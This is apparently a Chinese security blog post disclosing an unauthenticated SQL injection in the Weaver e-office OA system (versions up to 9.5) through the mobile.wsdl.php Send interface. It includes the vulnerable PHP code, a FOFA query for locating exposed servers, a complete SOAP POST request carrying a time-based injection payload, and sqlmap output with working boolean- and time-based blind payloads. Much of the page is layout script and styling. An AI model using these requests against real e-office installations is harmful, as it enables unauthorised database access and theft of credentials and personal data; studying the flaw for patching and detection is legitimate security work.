---
title: "泛微e-office mobile.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-mobile-wsdl-sqli.html
asset_dir: assets/泛微e-office-mobile.wsdl.php-sql注入漏洞
---

# 泛微e-office mobile.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/19 18:30
* 629浏览
* [0评论](#comment)
* 43分钟阅读

深入探索

SQL注入检测工具

编程语言教程

编码转换工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office mobile.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

安全认证考试

Web安全书籍

文本剥离工具

webservice-json/mobile/mobile.wsdl.php 的 `Send` 业务逻辑如下

```
function Send( $fromNumber, $toNumber, $content, $fromID, $toID )
{
    checkcurrentsession( );
    $mobile = new MobileSms( );
    $result = $mobile->Send( $fromNumber, $toNumber, $content, $fromID, $toID );
    return $result;
}
```

`$fromNumber, $toNumber, $content, $fromID, $toID` 带入 `Send` 函数

```
public function Send( $from_no, $to_no, $content, $from_id = "", $to_id = "" )
    {
        global $connection;
        global $_lang;
        if ( !$this->outAllow )
        {
            $sql = "\r\n\t\t\t\t\tSELECT COUNT(MOBIL_NO) AS cnt FROM user \r\n\t\t\t\t\t\tWHERE MOBIL_NO='".$to_no."'";
            $rs = exequery( $connection, $sql );
            $row = mysql_fetch_array( $rs );
```

深入探索

软件

网络安全培训

文件大小转换

`$to_no` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/mobile/mobile.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:MobileServicewsdl#Send
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:MobileServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:Send soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <fromNumber xsi:type="xsd:string">gero et</fromNumber>
         <toNumber xsi:type="xsd:string">sonoras' AND 4400=BENCHMARK(5000000,MD5(0x686d4650))-- bbLS</toNumber>
         <content xsi:type="xsd:string">quae divum incedo</content>
         <fromID xsi:type="xsd:string">verrantque per auras</fromID>
         <toID xsi:type="xsd:string">per auras</toID>
      </urn:Send>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office mobile.wsdl.php sql注入漏洞](images/img-001-928d68d9c467.webp)](https://image.mrxn.net/497b035cbb66402ea835343324640b5b.webp)

成功在延时 5 秒

漏洞修复方案

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 416 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:MobileServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:Send soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <fromNumber xsi:type="xsd:string">gero et</fromNumber>
         <toNumber xsi:type="xsd:string">sonoras' RLIKE (SELECT (CASE WHEN (8386=8386) THEN 0x736f6e6f726173 ELSE 0x28 END))-- OigS</toNumber>
         <content xsi:type="xsd:string">quae divum incedo</content>
         <fromID xsi:type="xsd:string">verrantque per auras</fromID>
         <toID xsi:type="xsd:string">per auras</toID>
      </urn:Send>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:MobileServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:Send soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <fromNumber xsi:type="xsd:string">gero et</fromNumber>
         <toNumber xsi:type="xsd:string">sonoras' AND 4400=BENCHMARK(5000000,MD5(0x686d4650))-- bbLS</toNumber>
         <content xsi:type="xsd:string">quae divum incedo</content>
         <fromID xsi:type="xsd:string">verrantque per auras</fromID>
         <toID xsi:type="xsd:string">per auras</toID>
      </urn:Send>
   </soapenv:Body>
</soapenv:Envelope>
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office mobile.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-mobile-wsdl-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-webservice-json-mobile-wsdl-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-mobile-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入防护

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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